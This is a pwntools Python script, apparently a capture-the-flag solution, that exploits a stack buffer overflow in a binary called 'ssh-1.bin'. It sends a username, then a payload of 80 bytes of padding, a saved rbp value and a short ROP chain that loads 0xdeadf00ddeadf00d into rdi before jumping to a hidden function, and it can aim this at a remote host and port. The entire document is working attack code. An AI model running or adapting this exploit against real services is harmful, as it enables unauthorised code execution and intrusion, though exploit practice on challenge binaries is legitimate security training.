from pwn import *

elf = ELF('ssh-1.bin')
rop = ROP(elf)

if len(sys.argv) > 1 and sys.argv[1] == 'server':
    io = remote('94.237.112.76',42069)
elif len(sys.argv) > 1 and sys.argv[1] == 'gdb':
    context(terminal=['tmux', 'split-window', '-v'])
    #context(terminal=['urxvt'])
    #context.terminal = 'urxvt'
    io = gdb.debug('./ssh-1.bin', '''
        break *0x0040170e
        # the stack broken ret
        break *0x00401719
        # multipop
        break *0x00401a14
        # file read
        break *0x0040154d
        #deadfood check
        break *0x00401590
        continue
        x/64x $sp
        info registers
        ''')
else:
    io = process('./ssh-1.bin')

print(io.recvregex(b':')) # read until we get the prompt
io.sendline(b'armand')
print(io.recvregex(b':')) # read until we get the prompt

offset = 88


def attack():
    nothing_to_see_here_addr = 0x00401526
    disobey_addr = 0x0040151c

    padding = 80*b'a'

    payload = padding
    payload += struct.pack("Q", 0x0) # This goes into rbp first
    payload += struct.pack("Q", disobey_addr) # rop to get rdi set up and keep ok
    payload += struct.pack("Q", 0xdeadf00ddeadf00d) # address for rdi
    payload += struct.pack("Q", nothing_to_see_here_addr) # place to go with new rdi

    info("Sending payload: ", payload)

    io.sendline(payload)
    io.interactive()

attack()

